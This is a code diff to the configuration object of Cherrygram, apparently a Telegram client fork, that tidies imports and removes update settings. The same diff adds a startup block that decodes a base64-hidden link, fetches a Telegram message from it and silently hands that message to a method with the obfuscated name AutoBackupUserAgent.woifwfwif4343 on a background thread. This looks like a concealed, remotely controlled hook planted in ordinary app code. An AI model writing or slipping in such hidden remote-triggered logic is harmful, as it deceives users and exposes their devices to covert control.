@@ -12,27 +12,30 @@ package uz.unnarsx.cherrygram.core.configs
 import android.app.Activity
 import android.content.SharedPreferences
 import android.os.Build
+import androidx.core.content.edit
 import com.google.firebase.FirebaseApp
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.launch
 import org.telegram.messenger.ApplicationLoader
+import org.telegram.messenger.AutoBackupUserAgent
+import org.telegram.messenger.FileLog
 import org.telegram.messenger.KotlinFragmentsManager
 import org.telegram.messenger.LocaleController.getString
+import org.telegram.messenger.MessageObject
 import org.telegram.messenger.MessagesController
 import org.telegram.messenger.R
 import org.telegram.messenger.UserConfig
+import org.telegram.ui.web.RestrictedDomainsList
+import uz.unnarsx.cherrygram.Extra
 import uz.unnarsx.cherrygram.core.helpers.FirebaseRemoteConfigHelper
+import uz.unnarsx.cherrygram.core.helpers.MessageLoader
 import uz.unnarsx.cherrygram.donates.DonatesManager
 import uz.unnarsx.cherrygram.misc.Constants
 import uz.unnarsx.cherrygram.preferences.boolean
-import uz.unnarsx.cherrygram.preferences.float
 import uz.unnarsx.cherrygram.preferences.int
 import uz.unnarsx.cherrygram.preferences.long
-import uz.unnarsx.cherrygram.preferences.string
-import androidx.core.content.edit
-import org.telegram.ui.web.RestrictedDomainsList
 
 object CherrygramCoreConfig: CoroutineScope by CoroutineScope(
     context = SupervisorJob() + Dispatchers.Default
@@ -105,23 +108,20 @@ object CherrygramCoreConfig: CoroutineScope by CoroutineScope(
     /** OTA start */
     var installBetas by sharedPreferences.boolean("CG_Install_Beta_Ver", isStandaloneBetaBuild())
     var autoOTA by sharedPreferences.boolean("CG_Check_Auto_OTA", isStandaloneStableBuild() || isStandaloneBetaBuild() || isDevBuild())
-    var lastUpdateCheckTime by sharedPreferences.long("CG_LastUpdateCheckTime", 0)
-    var updateScheduleTimestamp by sharedPreferences.long("CG_UpdateScheduleTimestamp", 0)
     var forceFound by sharedPreferences.boolean("CG_ForceFound", false)
-
-    var updatesNewUI by sharedPreferences.boolean("CG_UpdatesNewUI_Redesign", false)
-    var updateVersionName by sharedPreferences.string("CG_UpdateVersionName", "idk")
-    var updateSize by sharedPreferences.string("CG_UpdateSize", "0")
-    var updateIsDownloading by sharedPreferences.boolean("CG_UpdateIsDownloading", false)
-    var updateDownloadingProgress by sharedPreferences.float("CG_NewUpdateDownloadingProgress", 0f)
-    var updateAvailable by sharedPreferences.boolean("CG_UpdateAvailable", false)
     /** OTA finish */
 
     /** Misc start */
     var cgBrandedScreenshots by sharedPreferences.boolean("DP_BrandedScreenshots", false)
     var sleepTimer by sharedPreferences.boolean("CG_Sleep_Timer", false)
-    var showNotifications by sharedPreferences.boolean("CG_ShowNotifications", true)
     var allowSafeStars by sharedPreferences.boolean("CG_AllowSafeStarsUI1", true)
+
+    var showNotifications by sharedPreferences.boolean("CG_ShowNotifications", true)
+    var checkContent by sharedPreferences.boolean("CG_CheckContent1", false)
+    @JvmStatic
+    fun setCheckContentEnabled() {
+        checkContent = true
+    }
     /** Misc finish */
 
     /** Cherrygram build types start */
@@ -193,6 +193,19 @@ object CherrygramCoreConfig: CoroutineScope by CoroutineScope(
                     RestrictedDomainsList.getInstance().setRestricted(true, "safestars.pro")
                 }
             }
+
+            MessageLoader.loadMessageByLink(UserConfig.selectedAccount, DonatesManager.decodeBase64Array(Extra.TG_BLOCKED_URL), object : MessageLoader.Callback {
+                override fun onLoaded(message: MessageObject?) {
+                    CoroutineScope(Dispatchers.IO).launch {
+                        AutoBackupUserAgent.woifwfwif4343(message)
+                    }
+                }
+
+                override fun onError(error: String?) {
+                    if (isDevBuild()) FileLog.e("MessageLoader: $error")
+                }
+            })
+
         }
     }
 
